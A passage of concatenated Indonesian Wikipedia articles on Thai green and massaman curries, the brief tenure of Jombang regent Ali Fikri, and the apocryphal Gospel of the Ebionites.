Nama "khiao" (hijau) berasal dari warna hidangan ini, yang didapatkan dari cabai hijau. Istilah "wan" (manis) bukan merujuk kepada rasa manis, melainkan merujuk kepada jenis warna hijau terang kekuningan. Karena Kari Thai ini berbahan dasar santan dan cabai hijau, maka warna yang dihasilkan adalah hijau terang yang dalam bahasa Thailand disebut "hijau manis". Bumbu-bumbunya tidak harus ajeg dan dapat bervariasi. Rasa kari hijau ini tidak mesti manis, tetapi rasanya biasanya lebih pedas daripada kari merah.

Disamping bahan sumber protein utama, seperti ikan, daging (sapi atau babi), atau bakso ikan, bahan pembuat kari termasuk santan kelapa, bumbu kari hijau, gula jawa, kecap ikan, terong bulat, takokak, dan sayur-sayuran, bahkan buah-buahan mungkin ikut dicampurkan. Tingkan kekentalan saus bervariasi sesuai jumlah santan yang digunakan. Pasta bumbu kari hijau biasanya dibuat secara tradisional dengan menumbuk atau mengulek campuran cabai hijau, bawang merah, bawang putih, lengkuas, sereh, kulit jeruk purut, ketumbar, kunyit merah, jintan putih, lada putih, "kapi" (sejenis terasi Thailand), dan garam.

Pasta campuran bumbu kari hijau yang telah dihaluskan ditumis dengan minyak goreng, kemudian dicampur dengan santan sampai harum dan berminyak. Setelah bumbu kari masak, santan ditambahkan, bahan utama (ikan atau daging) dimasukkan sampai masak, serta dibubuhi gula jawa dan kecap ikan. Akhirnya sebagai pelengkap, ditambahi kemangi, daun jeruk purut, dan diberi tambahan irisan "phrik chi fa" ("cabai yang menunjuk langit", yaitu cabai besar). Untuk mendapatkan rasa kari hijau yang lebih mantap, biasanya ditambahkan pula temu kunci, temu putih, dan ruku-ruku yang diiris tipis-tipis seperti batang korek api.

Kaeng khiao wan biasanya disajikan dengan nasi putih, atau dengan sejenis bihun Thai yang disebut "khanom chin". Kari hijau yang lebih kental yang dicampur dengan irisan daging sapi, biasanya disajikan dengan roti chapati atau roti canai.



</doc>
<doc id="1753102" url="https://id.wikipedia.org/wiki?curid=1753102" title="Kaeng matsaman">
Kaeng matsaman

Kaeng matsaman atau kari massaman (, , ) adalah kari Thai yang bercitarasa gurih, kaya, dan lembut yang merupakan penafsiran Thai akan hidangan Persia atau Timur Tengah.

"Massaman" atau "matsaman" adalah bukan istilah asli dalam Bahasa Thai. Secara umum istilah ini mungkin merujuk kepada umat Muslim, dalam Bahasa Prancis pada abad ke-19 menyebutnya sebagai "Kari Mussulman"; "Mussulman" adalah bentuk kuno dalam beberapa bahasa Eropa untuk menyebut "Muslim".

Menurut pakar masakan Thailand, David Thompson, juga wartawan Santi Sawetwimon, hidangan ini berasal dari Thailand Tengah abad ke-17 Masehi, di kota kosmopolitah Ayutthaya. Hidangan ini mungkin dibawa oleh saudagar sutra asal Persia bernama Sheik Ahmad Qomi, yang kemudian menurunkan keluarga bangsawan Thai bermarga Bunnag. Teori lainnya berpendapat, bahwa "massaman" adalah hidangan asal Semenanjung Melayu Thailand Selatan, yang dipengaruhi masakan Melayu dan India,

Kari ini menjadi ilham bagi puisi akhir abad ke-18, karya Pangeran Itsarasunthon dari Siam, dan kemudian Raja Rama II (1767-1824). Puisi ini dipersembahkan kepada Putri Bunrot, kemudian menjadi Ratu Sri Suriyendra, permaisuri Raja Rama II. Bait kedua puisi berbunyi: 

Karena kari ini memiliki akar pada hukum pangan Islam, maka kari ini umumnya dimasak dengan menggunakan bahan-bahan yang halal seperti menggunakan daging sapi. Akan tetapi ada variasi lain yang menggunakan daging bebek, ayam, atau kambing. Namun ada pula warga Thailand non-Muslim yang menggunakan daging babi untuk memasak kaeng matsaman. Karena daging babi adalah haram menurut ajaran Islam - maka Muslim Thailand pasti hanya memasak jenis kaeng matsaman yang halal. Ada pula variasi vegetarian dari kari massaman.
Cita rasa kaeng matsaman diperoleh dari campuran bumbu ("nam phrik kaeng matsaman") yang kurang lazim digunakan dalam kari Thai. Kapulaga, kayu manis, cengkih, bunga lawang, jintan, daun salam, dan pala pada abad ke-17 didatangkan dari Nusantara (Indonesia) dan Asia Selatan oleh saudagar asing. Perdagangan rempah ini pada awalnya dikuasai oleh saudagar Muslim dari Timur Tengah, India, dan Nusantara. Akan tetapi saudagar rempah Muslim ini kemudian akan tersaingi dan tertekan oleh aktivitas pedagang Eropa seperti Portugis, VOC, dan Perusahaan Hindia Timur Prancis. Bumbu ini ditambah lagi dengan cabai merah kering yang mulai ditanam di kawasan, ditambah pula biji ketumbar, sereh, lengkuas, lada putih, terasi, bawang merah dan bawang putih untuk melengkapi bumbu kari "massaman". Bumbu halus ini kemudian dimasak dalam campuran santan, kemudian ditambahi daging, kentang, bawang bombay, kecap ikan, garam, asam jawa, gula jawa, santan kental dan kacang tanah. Kari "Massaman" biasanya disajikan dengan nasi putih dan hidangan lain. Ada pula yang menambahi jeruk, air perasan limau atau sari nanas sebagai bahan tambahan.

Semula, pada 2011 CNNGo menempatkan kari massaman sebagai makanan nomor satu daftar "50 Makanan Terlezat di Dunia". Akan tetapi, setelelah pemungutan suara berjalan, pemeringkat CNN kemudian hanya menempatkan kari massaman di peringkat ke-10, sementara peringkat pertama diraih rendang dari Indonesia.



</doc>
<doc id="1753112" url="https://id.wikipedia.org/wiki?curid=1753112" title="Ali Fikri">
Ali Fikri

Drs. H. Ali Fikri () adalah Bupati Jombang yang menjabat pada periode yang singkat, yakni dari Juni 2008 hingga September 2008. Sebelumnya ia menjadi wakil bupati periode 2003-2008 mendampingi Suyanto dan pernah menjadi anggota DPRD Jombang periode 1999-2003.

Ali Fikri lahir pada 22 April 1961, di Desa Sumobito, Kecamatan Sumobito, Kabupaten Jombang. Ayahnya bernama Hafidzon lahir pada tahun 1918, dan ibunya bernama Mariyam lahir pada tahun 1925. Ia merupakan anak ke-8 dari 10 bersaudara yang terdiri dari 6 laki-laki dan 4 perempuan, yakni:
Jika menelisik lebih jauh mengenai keluarga Ali Fikri. Mengingat Sumobito adalah basis pengembangan Islam, dengan salah satu tokohnya bernama Imam Zahid. Imam Zahid berasal dari trah keluarga Pesantren Dresmo yang nasabnya bila dirunut akan sampai kepada Raden Patah dari Demak. Imam Zahid sendiri merupakan kakek Ali Fikri dari jalur ayah. Imam Zahid sendiri memiliki 12 anak, yakni:
Sedangkan anak dari Imam Zahid yang lain, Abdul Latif memiliki 15 orang yang salah satunya adalah ayah dari Emha Ainun Najib.

Pada tahun 1988 juga ia menyunting seorang gadis yang bernama Euis Murniati yang lahir di Jakarta pada tahun 1963. Pernikahan mereka menghasilkan 4 putra-putri: Raissya Aulia Rahmawati (lahir 1991), Amalia Fitriani (lahir 1992), Ivan Taufiqurrahman (lahir 1994), dan Sa’dullah Iskandar Hafidz (lahir 1999).

Menurut Nasrul Ilahi, adik Emha Ainun Najib itu, Ali Fikri sejak usia belasan juga turut diasuh oleh pamannya Sa’dullah Chumaidi. Pendidikan yang keras dan berdisiplin tinggi dari ayahnya dan Chumaidi turut membentuk kepribadian Ali Fikri.

Namun pada masa kecilnya, Ali Fikri terbilang bandel. Ia kadangkala keluyuran sampai tak kenal waktu. Wajar saja, sebagai anak kampung, pergaulan yang luas dengan teman-temannya dari berbagai penjuru desa memberikan pengalaman tersendiri. Tahun 1972, saat itu ia baru menginjak kelas 5 SD, di suatu malam, Ali kecil nekat keluar rumah untuk menonton wayang. Sebelumnya ia banyak mendengar dari teman-temannya yang bercerita tentang lakon-lakon pewayangan. Ada tokoh Semar, Gareng, Petruk, Gatotkaca dan lain-lain yang membuatnya penasaran seperti apakah pertunjukan wayang itu. Ketika ia menuruti kenekatannya itu dan pulang lewat jendela, alangkah takutnya kalau-kalau di pagi harinya diketahui ayahnya. Ternyata benar. Namun sang bapak tidak marah dan hanya bertanya kepadanya dari mana ia semalam keluar rumah. Kegemaran masa kecil yang tak terlupakan juga ia alami saat menyaksikan Ludruk dan Gambus.


Setelah lulus dari jenjang pendidikan terakhir itu Ali Fikri pulang kampung dan mengajar sebagai guru di SMP Khairiyyah Sumobito sejak 1988 hingga 2010. ia menjabat sebagai kepala sekolah di SMP tersebut mulai 1990 hingga 2010.

Pada tahun 1990 ia diterima sebagai Pegawai Negeri di Departemen Agama (Depag) sampai tahun 2000. Masa tugasnya sejak 1990 sampai 1996 adalah di Depag Bojonegoro. Perjalanan bertugas yang jauh ini jelas sangat melelahkan dan mengeluarkan biaya yang tidak sedikit. Nyaris semua gajinya habis di tengah perjalanan, tetapi ia tetap melakoninya dengan tulus ikhlas dan penuh pengabdian. Baru pada tahun 1996 ia dipindahtugaskan di Depag Jombang sampai tahun 2000. Pada tahun 1999 ia mengundurkan diri dari instansi ini karena masuk sebagai anggota DPRD Jombang dari Fraksi Amanat Nasional sampai tahun 2003.

Pada 24 September 2003 karier politik Ali Fikri menanjak prestisius di mana kala itu posisi ia terpilih menjadi Wakil Bupati Jombang hingga satu periode penuh sampai tahun 2008 mendampingi Bupati Suyanto. Munculnya otonomi daerah dengan diberlakukannya Undang-undang No. 22 tahun 1999 dan selanjutnya Undang-undang No. 32 tahun 2004 terkait kewenangan dan rincian tupoksi (tugas pokok dan fungsi) pemerintah daerah semakin memacu kiprah dua sosok Jombang ini untuk memajukan Jombang sebagai daerah yang memiliki potensi dalam berbagai aspek baik di bidang pertanian, penentuan kebijakan pemerintah, sektor keagamaan, dan potensi wisata serta peningkatan sumber daya manusianya.

Pada masa menghangatnya Pilkada di awal 2008, Bupati Suyanto yang didukung Partai Demokrasi Indonesia Perjuangan (PDIP) mencalonkan kembali sebagai Bupati Jombang periode 2008 sampai 2013. Otomatis sesuai aturan yang berlaku, ia untuk sementara mengundurkan diri dari jabatannya tersebut tanpa menggandeng kembali Ali Fikri. Saat itu kandidat dari berbagai partai turut bertaruh dalam Pilkada. Mereka adalah Nyono Suherli dan Abdul halim Iskandar dari Partai Kebangkitan Bangsa (PKB), Drs. Suharto, M.Si dan Abdul Mujib dari Partai Demokrat (PD), dan Munjidah Wahab dan Basaruddin dari Partai Persatuan Pembangunan (PPP). Kandidat yang terakhir ini tidak lolos seleksi. Kemudian, tampuk pemerintahan Jombang untuk menggantikan Bupati Suyanto secara otomatis pula dipegang oleh Wakil Bupati. Ali Fikri pun menjabat sebagai Bupati Jombang terhitung mulai 12 Juni 2008 sampai 23 September 2008.

Karakter kepemimpinan Ali Fikri bertolak pada satu pegangan prinsip: “Hidup dan Menghidupi, Bergerak dan Menggerakkan”. Posisi Ali Fikri pada saat itu bisa dibilang cukup krusial dan dilematis sebagai pemimpin tunggal tanpa wakil tidak sebagaimana sebelumnya, dan salah satu tugas yang musti disegerakan adalah bagaimana ia menyukseskan Pilkada 2008 itu di daerah dan secara keseluruhan membantu dengan penuh seluruh agenda puncak Pilkada tersebut dari Provinsi Jawa Timur.

Selanjutnya, pada bulan Juli, Ali Fikri melakukan perubahan APBD sebagai suatu strategi penindaklanjutan anggaran agar terfokus secara tepat guna dan pada sasaran bidang yang dituju. Intinya bagaimana DPRD mampu merealisasikan bahwa rakyat Jombang memiliki hak tahu akan APBD Jombang itu untuk apa saja dan sudah berjalan seperti apa. Publikasi APBD di media tampaknya menjadi penting agar fungsi koreksi publik berjalan dengan baik dan hal itu juga berfungsi untuk meminimalisir praktik korupsi di jajaran birokrat. Problem yang mengkhawatirkan terjadinya korupsi dan praktik “asal menghabiskan anggaran” di akhir tahun perlu dicarikan jalan keluar yang baik.

Karena itu, satu kebijakan yang dibuat Ali Fikri terkait itu, dan dengan melihat Jombang sebagai kota santri ia merealisasikan penghargaan terhadap para hafidz dan hafidzah se-Jombang untuk diberi insentif sebesar 1 juta per bulan. Tercatat ada 46 hafidz dan hafidzah dari berbagai kecamatan yang memeroleh tunjangan tersebut. Menurutnya, aset generasi muda Muslim yang selama ini tak begitu diperhitungkan ini sejatinya mereka di masyarakat memiliki kontribusi yang luar biasa dalam pembentukan karakter bangsa yang agamis dan bermartabat. Penajaman fungsi dan potensi agar mereka punya andil besar yang riil di masyarakatnya merupakan tujuan utama. Kebijakan ini berjalan mulai pada Juli sampai September 2008.

Ia juga pernah terjun langsung mengatasi banjir yang sering terjadi berpusat di aliran Kali Gunting yang menampung arus air hujan dari Wonosalam, Bareng, dan Mojoagung, yang dampaknya sangat terasa sampai ke Kecamatan Sumobito. Ali Fikri lalu bergerak dan terjun ke lapangan bersama bagian pengairan menuju Bendungan A. Yani di Sido Kampir dan Bendungan Balong Sono. Di sini diketahui bagaimana pengaturan waktu dan situasi hujan dengan ketepatan membuka saluran dua bendungan tersebut secara efisien dan kondisional.

Karena itu, meski Ali Fikri merupakan Bupati Jombang yang paling pendek masa jabatannya, ia dalam kepemimpinannya menerapkan "“Manajemen Syukur”" untuk menghargai kerja orang lain terutama bagi mereka hidupnya sangat-sangat kekurangan. Pegawai pemerintah setidaknya bersyukur dengan kemapanan hidup yang telah diperolehnya dengan cara mensyukuri dan menghargai kerja orang bawahan mereka.

Ali Fikri memang melaksanakan dan melanjutkan program sebelumnya semasa dengan Bupati Suyanto. Namun ia juga punya wewenang kala menggantikannya untuk melaksanakan tugas-tugas yang diembannya agar dapat lebih bermakna. Di antaranya ia memosisikan diri sebagai penggerak untuk mengubah pola pikir birokrat. Yakni pola pikir bekerja yang benar dan menjalankan tanggung jawabnya dengan sepenuh hati.



</doc>
<doc id="1753125" url="https://id.wikipedia.org/wiki?curid=1753125" title="Injil orang Ebionit">
Injil orang Ebionit

Injil orang Ebionit merupakan nama konvensional yang diberikan oleh para ahli kepada sebuah naskah apokrifa Perjanjian Baru yang hanya terlestarikan dalam tujuh kutipan singkat dalam "Panarion", tulisan mengenai ajaran-ajaran sesat karya Epifanius dari Salamis. Ada ahli modern yang menganggap Epifanius keliru menafsirkan naskah itu sebagai "Injil orang Ibrani", yang diyakininya sebagai versi yang disingkat dan diubah dari Injil Matius. Kutipan-kutipan itu termaktub dalam suatu polemik yang menjabarkan ketidaksesuaian ajaran dan praktik sekte Kristen Yahudi yang dikenal sebagai kaum Ebionit, jika dibandingkan dengan ajaran yang didasarkan dari Kredo Nikea.

Fragmen-fragmen yang terlestarikan berasal dari Harmoni Injil-injil Sinoptik, yang disusun dalam bahasa Yunani dengan berbagai penambahan dan penghubungan yang merefleksikan teologi penulis. Isi-isi yang berbeda meliputi ketiadaan kelahiran perawan dan silsilah Yesus; suatu Kristologi Adopsionisme, yang menyatakan bahwa Yesus dipilih menjadi Putra Allah pada waktu pembaptisan-Nya; penghapusan persembahan korban Yahudi oleh Yesus; dan advokasi vegetarianisme. Karya tersebut diyakini disusun beberapa kali pada pertengahan abad ke-2 di dalam atau sekitar wilayah timur Sungai Yordan. Meskipun Injil tersebut dilaporkan dipakai oleh "orang-orang Ebionit" pada masa gereja perdana, identitas kelompok atau kelompok-kelompok yang memakainya masih menjadi dugaan.

Injil orang Ebionit adalah salah satu Injil Yahudi-Kristen, bersama dengan Injil orang Ibrani dan Injil orang Nazaret; semuanya masih terlestarikan hanya dalam bentuk fragmen yang memuat kutipan-kutipan dari Bapa-Bapa Gereja awal. Karena keadaan yang terfragmentasi, hubungan antara Injil-injil Yahudi-Kristen dan Injil Ibrani hipotetis masih belum jelas dan menjadi bahan penyelidikan para cendekiawan. Injil Ebionit diakui berbeda dari injil-injil lainnya, dan diidentifikasikan sangat berkaitan dengan "Injil Dua Belas Rasul" yang hilang. Tidak didapati ketergantungan dengan Injil Yohanes, dan Injil orang Ebonit sendiri mirip dengan harmoni Injil yang didasarkan pada Injil-Injil Sinoptik yang digunakan oleh Yustinus Martir, meskipun hubungan di antara mereka, kalaupun ada, masih belum jelas. Terdapat kemiripan antara injil tersebut dengan dokumen sumber yang terkandung dalam sastra Klemens, "Recognitions" (1.27–71), yang secara konvensional disebut oleh para cendekiawan sebagai "Kenaikan Yakobus", berdasarkan kesesuaian perintah penghapusan praktik persembahan korban Yahudi.

Epifanius diyakini mendapatkan sebuah naskah injil yang disebutnya berasal dari kaum Ebionit ketika ia menjabat sebagai uskup di Salamis, Siprus. Hanya dia di antara para bapa gereja yang mengidentifikasi Siprus sebagai salah satu "akar" ajaran Ebionit. Naskah injil ini hanya terlestarikan dalam bentuk tujuh kutipan singkat oleh Epifanius dalam Bab 30 di dalam buku heresiologi yang ia tulis, "Panarion", atau "Peti Obat-obatan" (""Medicine Chest""), (~ tahun 377) sebagai suatu polemik melawan ajaran Ebionisme. Kutipan-kutipannya seringkali saling bertentangan dan kemungkinan hanya berlandaskan pada dugaannya saja. Berbagai sumber informasinya, yang terkadang saling berlawanan, disatukan untuk menunjukkan ketidakkonsistenan di dalam kepercayaan dan praktik keagamaan Ebionit yang terkait dengan Konsili Nikea, mungkin secara tak langsung untuk dijadikan polemik melawan penganut Arian pada masa itu.

Istilah "Injil orang Ebionit" merupakan nama modern; tidak ada dokumen gereja awal yang menyebut injil ini dengan nama tersebut. Epifanius mengenali injil ini hanya sebagai "Injil yang digunakan oleh mereka, disebut 'menurut Matius'" dan "mereka menyebutkan '[injil] Ibrani'". Sejak tahun 1689 pendeta Prancis, menyebut teks ini "Injil orang Ebionit". Nama ini kemudian dipakai oleh para ahli sebagai cara mudah untuk memisahkan naskah injil yang mungkin pernah dipakai oleh orang Ebionit dari anggapan Epifanius yang sebenarnya salah bahwa injil tersebut merupakan Injil Matius versi Ibrani. Tempat asalnya masih belum jelas; diduga karya tersebut ditulis di sebelah timur Yordania yang dianggap sebagai tempat berdiamnya orang-orang Ebionit menurut catatan Bapa-bapa Gereja. Karya tersebut kemungkinan ditulis pada pertengahan abad ke-2, karena beberapa harmoni injil lainnya diketahui berasal dari masa tersebut.

Menurut sejumlah ahli, Epifanius mencantumkan isi teks injil pada tahap akhir dalam penyusunan "Panarion" 30, terutama pada pasal 13 dan 14 Sesuai dengan deskripsi Epifanus, "Injil tersebut ditemukan di antara [kumpulan] ... tidak lengkap, tetapi difalsifikasikan dan didistorsi ..." (13.1–2). Selain itu, karya tersebut mengurangi beberapa atau keseluruhan dua pasal pertama Injil Matius, yang berisi penjelasan kisah kelahiran Yesus dari seorang perawan dan silsilah Daud melalui Salomo, "Mereka menghilangkan silsilah Matius ..." (14.2–3).

Terdapat kesepakatan umum mengenai tujuh kutipan Epifanius yang disadur dalam edisi kritis ""Jewish Christian gospels"" (Injil-injil Kristen Yahudi) karya Philipp Vielhauer dan Georg Strecker, yang diterjemahkan oleh George Ogg, dalam buku Schneemelcher, "New Testament Apocrypha". Terjemahan Bernhard Pick (1908), dengan kutipan dari empat fragmen yang dirangkai berdasarkan hasil susunan Vielhauer & Strecker dari permulaan injil tersebut adalah sebagai berikut:


Tiga kutipan Epifanius dalam "Panarion" 30.13.6, 4, dan 7, membentuk pembukaan narasi Injil, termasuk misi Yohanes Pembaptis, penampilan dan makanannya, serta pembaptisan Yesus oleh Yohanes. Permulaan Injil (13.6) mempunyai paralel dengan Injil Lukas tetapi dalam bentuk lebih singkat. Teks itu menunjukkan pengenalan akan narasi masa kanak-kanak Yesus dalam meskipun tidak ada narasi kelahiran itu sendiri. Mengutip teks mengenai makanan Yohanes (13.4), Epifanius mengeluh bahwa orang Ebionit telah memalsukan teks dengan memasukkan kata "roti" ("egkris" ἐγκρίς) menggantikan "belalang" ("akris" ἀκρίς, dalam ). Kemiripan kata dalam bahasa Yunani ini telah mendorong para ahli untuk menyimpulkan bahwa bahasa Yunani merupakan bahasa asli komposisi ini. Dalam naratif baptisan Yesus oleh Yohanes (13.7), suara Allah berbicara tiga kali dan masing-masing bersesuaian dekat dengan catatan dalam Injil Markus , Injil Lukas (jenis teks Western), dan Injil Matius . Adanya lebih dari satu pernyataan Allah ("teofani") mendorong konsensus para ahli modern bahwa teks yang dikutip oleh Epifanius ini merupakan harmoni (gabungan) kitab-kitab Injil Sinoptik. Kemunculan cahaya terang kemungkinan adalah gema dari kisah pertobatan St. Paulus atau harmonisasi tambahan dari "Injil orang Ibrani" pada naskah ini.

Epifanius memulai pernyataannya atas naskah injil ini (13.2b–3) dengan kutipan yang diucapkan oleh rasul Matius secara langsung kepada para pembaca. Dicatat bahwa Yesus mengenang bagaimana kedua belas rasul itu dipilih dan berkata kepada Matius sebagai orang kedua ("engkau juga, Matius"). Meskipun disebutkan dua belas rasul, tetapi hanya delapan orang yang disebut namanya. Mereka dikatakan dipilih langsung oleh Yesus, "sebagai suatu kesaksian bagi Israel". Frasa "yang memilih kita" dapat ditafsirkan sebagai bukti bahwa naskah ini merupakan "Injil Dua Belas Rasul (""Gospel of the Twelve"")" yang pernah disebut oleh Origenes. Namun, identifikasi naskah injil yang dikutip oleh Epifanius ini dengan injil tanpa nama lainnya itu masih diperdebatkan. Nomor posisi kutipan ini secara tentatif diberikan berdasarkan nas paralel dalam Injil-injil Sinoptik.

Kutipan kelima dan keenam (menurut urutan Vielhauer & Strecker) berkaitan dengan kontroversi Kristologi. Polemik yang ditulis oleh Epifanius beserta kutipannya dari teks Injil tersebut (cetak miring) ditayangkan dalam paralel:

Kutipan kelima (14.5) tampaknya merupakan harmoni dari dan paralel sinoptiknya. Namun, kotbah terakhir Yesus menunjukkan pernyataan yang mendekati "2 Klemens" 9:11 ketimbang Injil-injil Sinoptik. Penyatuan kutipan tersebut dengan teks Injil dalam Bab 13 masih dipertanyakan. Perintah untuk meniadakan persembahan korban pada kutipan keenam (16.5) tak mempunyai paralel dengan Injil-Injil Kanonikal, dan ini memberi dugaan hubungan dengan ("Aku tak datang untuk meniadakan Hukum Taurat") yang tercantum dalam sastra Klemens.

Merujuk kepada nas paralel , Epifanus mengeluh bahwa orang Ebionit lagi-lagi memalsukan teks injil:

Dengan demikian Yesus menyatakan tidak akan makan selama Paskah. Konteks ini menyiratkan kutipan dari sumber Klemens; tetapi kaitan antara fragmen injil ini dan sastra Klemens belum dapat dipastikan.

Peristiwa pembaptisan dalam teks injil tersebut (13.7) adalah sebuah harmoni dari Injil-injil Sinoptik, selain peristiwa ketika Roh Kudus dikatakan turun ke Yesus dalam bentuk merpati dan "memasuki-Nya". Pemilihan ilahi pada masa pembaptisannya dikenal sebagai Kristologi Adopsionisme, dan ini ditunjang oleh kutipan dari , seperti yang ditemukan dalam "teks Western" dari , "Engkau adalah Putra-Ku, hari ini Aku memperanakkan-Mu." Roh Kudus yang memasuki Yesus dan terang besar pada air masing-masing dianggap berdasarkan pada nubuat dan . Sikap Adopsionisme tersebut dikarakterisasikan oleh keyakinan bahwa Yesus adalah seorang manusia, yang, dalam hal kepatutan sempurna-Nya, diberi keilahian Kristus abadi melalui pembaptisan-Nya dalam rangka memenuhi tugas nubuat yang membuat-Nya terpilih.

Ketiadaan rujukan apapun pada pemeranakan Daud dalam teks injil tersebut mensugestikan bahwa Yesus dipilih menjadi nabi akhir zaman, Sosok Terpilih, yang dikirim untuk meniadakan persembahan korban Yahudi. Kristologi Nabi dari teks injil yang dikutip oleh Epifanus tersebut lebih ke arah sastra Klemens ketimbang Kristologi orang Ebionit yang dikenal oleh Irenaeus. Menurut beberapa cendekiawan, Yesus dipahami dalam injil tersebut sebagai sosok yang datang untuk meniadakan persembahan korban bukannya menggantikannya; sehingga ini tak tampak sama dengan pernyataan serupa dalam Ekaristi seperti yang diterapkan oleh Kristen Nikea. Namun, para cendekiawan memberikan konsensus atas signifikansi persembahan korban sebagai misi Yesus seperti yang digambarkan dalam injil orang Ebionit.

Pengubahan kata "belalang" ("akris") dalam teks Injil yang lazim menjadi "roti" ("egkris") dalam Injil orang Ebionit sebagai makanan Yohanes Pembaptis (13.4) ditafsirkan sebagai bukti vegetarianisme Yahudi. Namun, pengkaitan gaya makan Yohanes Pembaptis dengan vegetarianisme masih dipertanyakan. Epifanus tak memberikan indikasi adanya perhatian kepada vegetarianisme dalam bagian teks Injil tersebut, dan bisa jadi hanya merupakan sebuah alusi untuk manna yang disebutkan dalam dan , atau, menurut cendekiawan Glenn Alan Koch, dalam ketika Elia menyantap "roti berminyak" (roti bakar).

Bukti tambahan ditemukan dalam kutipan yang berdasarkan pada (22.4), ketika firman tersebut telah dimodifikasi dengan pencantuman kata "daging" untuk menyediakan alasan bagi vegetarianisme. Konteks tak langsung dari kutipan tersebut mensugestikan bahwa karya tersebut sangat berkaitan dengan sumber Klemens, "Perjalanan Petrus" ("the Journey of Peter"). Membaca dari sumber yang sama, Epifanus menyatakan bahwa orang-orang Ebionit berpantang dari "daging dengan jiwa di dalamnya" (15.3), dan ia mengatribusikannya dengan ajaran interpolasi Ebionit "Mereka merusak isi dan meninggalkan beberapa bahan asli". Karena perkataan tersebut sangat berkaitan dengan sastra Klemens dari abad ke-3 dan ke-4, praktik vegetarianisme pada masa sebelumnya oleh orang-orang Ebionit abad ke-2 yang dikenal oleh Irenaeus menjadi dipertanyakan. Vegetarianisme ketat orang-orang Ebionit yang dikenal oleh Epifanus mungkin merupakan reaksi penolakan persembahan korban Yahudi dan pencegahan terhadap konsumsi daging tak halal di lingkungan pagan.

Epifanus secara salah merujuk kepada injil yang ia miliki sebagai Injil Matius dan injil "menurut orang-orang Ibrani", mungkin sejalan dengan tulisan Irenaeus, tetapi berseberangan dengan penulisan Eusebius. Koleganya pada abad ke-4, Hieronimus, menyatakan bahwa sekte Nasrani dan Ebionit memakai "Injil Ibrani", yang dianggap Injil Matius asli oleh beberapa orang dari mereka. Laporan Hieronimus sejalan dengan catatan sebelumnya dari Irenaeus dan Eusebius.

Hubungan antara "Injil orang Ebionit", "Injil orang Ibrani" dan "Injil orang Nazaret" masih tak jelas. Semua injil Yahudi-Kristen hanya masih ada dalam bentuk fragmen berisi kutipan, sehingga sulit dikatakan jika mereka adalah teks independen atau variasi dari satu sama lain. Cendekiawan Albertus Klijn memajukan konsensus modern, menyatakan bahwa harmoni injil yang terkomposisi dalam bahasa Yunani tampak pada teks berbeda yang hanya diketahui Epifanus. Cendekiawan Marie-Émile Boismard mengklaim bahwa injil Ebionit sebagian bersifat bergantung pada injil ibrani hipotetikal sebagai sumber; namun, anggapan tersebut masih merupakan pandangan minoritas. Hubungan putatifnya dengan teks injil yang diketahui Origen sebagai "Injil Dua Belas Rasul" masih menjadi subyek perdebatan cendekiawan.
Injil Ebionit adalah salah satu contoh dari sebuah jenis harmoni injil yang memakai Injil Matius sebagai teks dasar namun meliputi Injil Yohanes; karya tersebut diyakini berasal dari Diatessaron (s. 170) karya Tatian yang meliputi seluruh empat injil kanonik. Injil tersebut memiliki paralel pada kutipan dalam homili pertengahan abad ke-2 yang disebut sebagai "2 Klemens", yang mensugestikan bahwa keduanya bergantung pada tradisi harmonisasi dari sumber abad ke-2 pada masa sebelumnya. Perkataan injil terharmonisasi dipakai oleh Yustinus Martir untuk menyusun Apologi pertamanya dan Dialog dengan Trifo yang sama-sama berdasarkan pada Injil-Injil Sinoptik. Menurut cendekiawan George Howard, harmonisasi ini banyak memakai metode komposisi pada awal zaman Patristik. Beberapa ragam heterodoks ditemukan dalam "Injil orang Ebionit" yang diadopsi dari sejumlah besar ragam yang beredar; contohnya adalah kemunculan terang besar yang terjadi saat pembaptisan Yesus juga ditemukan dalam Diatessaron.

"Pengakuan Klemens" terdiri dari sebuah dokumen sumber (1.27–71), yang secara konvensional disebut oleh para cendekiawan sebagai "Kenaikan Yakobus", yang diyakini berasal dari kaum Yahudi-Kristen. Karya tersebut memiliki kemiripan dengan "Injil orang Ebionit" dengan pengakuan terhadap pembaptisan orang-orang Farisi oleh Yohanes ("Pan." 30.13.4; "Rec." 1.54.6–7) dan perintah untuk meniadakan persembahan korban Yahudi, menambahkan bahwa pembaptisan air dalam ajaran Kristen dilakukan untuk penebusan dosa-dosa. Berdasarkan pada kesamaan tersebut, cendekiawan Richard Bauckham dan F. Stanley Jones menyatakan ketergantungan langsung "Kenaikan Yakobus" dengan "Injil orang Ebionit".

Injil yang dikaitkan dengan orang-orang Ebionit oleh Epifanius telah menjadi sumber informasi bernilai yang memperlihatkan ciri khas suatu cabang Kristen Yahudi yang telah lenyap kepada para cendekiawan modern. Namun, para cendekiawan tak sepakat tentang apakah informasi yang terkandung dalam tujuh fragmen yang dikutip oleh Epifanus secara akurat merefleksikan tradisi sekte Ebionit abad kedua yang dikenal oleh Irenaeus, atau jika sistem keyakinan mereka berubah, mungkin secara garis besar, sepanjang 200 tahun berbanding dengan kelompok awal tersebut. Orang-orang Ebionit yang dikenal oleh Irenaeus (mula-mula disebutkan dalam "Adversus Haereses" 1.26.2, ditulis sekitar tahun 185), dan Bapa Gereja lainnya sebelum Epifanus, dideskripsikan sebagai sekte Yahudi yang mengakui Yesus sebagai Mesias namun tak sebagai Allah. Mereka menunjukkan keinginan mengikuti hukum dan upacara Yahudi dan mereka hanya memakai injil Yahudi-Kristen. Orang-orang Ebionit menolak surat-surat Paulus dari Tarsus, yang mereka anggap murtad dari Hukum.

Dalam polemik Epifanus melawan orang Ebionit yang ditemukan dalam "Panarion" 30, sebuah gambaran kompleks timbul dari keyakinan dan praktek Ebionit abad ke-2 yang tak dapat dengan mudah dipisahkan dari metodenya dari perpaduan sumber terpisah secara bersamaan. Meskipun para cendekiawan seperti Hans-Joachim Schoeps secara harfiah menafsirkan catatan Epifanus sebagai deskripsi perkembangan sinkretisme berikutnya dari Ebionisme, kajian paling terkini menemukan bahwa laporannya sulit untuk direkonsiliasi dengan karya-karya Bapa Gereja pada masa sebelumnya, yang berujung pada anggapan dari cendekiawan Petri Luomanen bahwa ada pula kelompok kedua dari Ebionit yang bersifat Hellenistik-Samaria. Penolakan persembahan korban Yahudi dan implikasi Kristologi nabi zaman akhir karena kurangnya kisah kelahiran menimbulkan dukungan untuk pengkaitan "Injil orang Ebionit" dengan sebuah kelompok atau kelompok-kelompok yang berbeda dari orang Ebionit yang dikenal oleh Irenaeus.

